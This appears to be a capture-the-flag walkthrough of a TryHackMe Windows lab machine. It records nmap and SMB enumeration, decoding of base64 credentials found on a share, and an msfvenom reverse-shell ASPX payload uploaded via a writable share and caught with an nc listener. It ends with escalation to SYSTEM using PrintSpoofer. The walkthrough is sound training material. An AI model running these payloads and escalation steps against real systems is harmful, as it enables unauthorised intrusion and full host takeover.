# Relevant

## Brief

IP: 10.10.9.49
Windows System
Webservice on port 80

Bob - !P@$$W0rD!123 > has access via RPC
Bill - Juw4nnaM4n420696969!$$$ > Fake user?

## Scanning the system

### nmap

>> nmap -sV -n -p- -oN nmap.out $TARGET                    
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 20:06 CET
Nmap scan report for 10.10.9.49
Host is up (0.038s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.65 seconds

### smb

>> nmap --script smb-enum-shares.nse -p445 10.10.9.49                                     
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 20:11 CET
Nmap scan report for 10.10.9.49
Host is up (0.039s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.9.49\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.9.49\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.9.49\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.9.49\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 30.92 seconds

#### nt4wrksv
>> smbclient //10.10.9.49/nt4wrksv -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 22 20:11:30 2020
  ..                                  D        0  Sun Nov 22 20:11:30 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4950110 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0,6 KiloBytes/sec) (average 0,6 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                   
┌──(niknitro㉿kali)-[~/thm/relevant]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk          

Which means;
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$

### RPC
rpcclient $> srvinfo
        10.10.9.49     Wk Sv NT SNT         
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003


rpcclient $> lookupnames administrators
administrators S-1-5-32-544 (Local Group: 4)
rpcclient $> lookupnames administrator
administrator S-1-5-21-3981879597-1135670737-2718083060-500 (User: 1)
rpcclient $> lookupnames Bill
result was NT_STATUS_NONE_MAPPED
rpcclient $> lookupnames Bob
Bob S-1-5-21-3981879597-1135670737-2718083060-1002 (User: 1)

                                  
                                           
### rdp               

rdesktop -u Bob -p - -k pt -g 1440x900 -T "MY REMOTE SERVER" -N -a 16 -z -xl -r clipboard:CLIPBOARD -r disk:SHARE_NAME_ON_REMOTE=C:\temp 10.10.8.187 
ERROR :(


### webservices

└─$ dirb http://10.10.9.49:49663 custom.txt                                                  
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov 22 20:51:18 2020
URL_BASE: http://10.10.9.49:49663/
WORDLIST_FILES: custom.txt

-----------------

GENERATED WORDS: 25758                                                            

---- Scanning URL: http://10.10.9.49:49663/ ----
==> DIRECTORY: http://10.10.9.49:49663/aspnet_client/
==> DIRECTORY: http://10.10.9.49:49663/nt4wrksv/     
                                                                                                                                                                                                  
---- Entering directory: http://10.10.9.49:49663/aspnet_client/ ----
==> DIRECTORY: http://10.10.9.49:49663/aspnet_client/system_web/                          
---- Entering directory: http://10.10.9.49:49663/aspnet_client/system_web/ ----
---- Entering directory: http://10.10.9.49:49663/nt4wrksv/ ----                                                                                              

## Exploiting the system

┌──(niknitro㉿kali)-[~/thm/relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.186.161 LPORT=8888 -f aspx -o shell.aspx                                                      1 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3416 bytes
Saved as: shell.aspx
                                   
┌──(niknitro㉿kali)-[~/thm/relevant]
└─$ smbclient //10.10.8.187/nt4wrksv
Enter WORKGROUP\niknitro's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (30,3 kb/s) (average 1,5 kb/s)

                                                                                                                        
┌──(niknitro㉿kali)-[~/thm/relevant]
└─$ nc -nlvp 8888                                                                                
listening on [any] 8888 ...
connect to [10.9.186.161] from (UNKNOWN) [10.10.8.187] 49884
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool


### Getting shell

PS C:\inetpub> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


  I want to start things off with this quote from @decoder_it: “if you have SeAssignPrimaryToken or SeImpersonate privilege, you are SYSTEM”.
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

Exploit: https://github.com/itm4n/PrintSpoofer



PS C:\inetpub\wwwroot\nt4wrksv> .\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system



         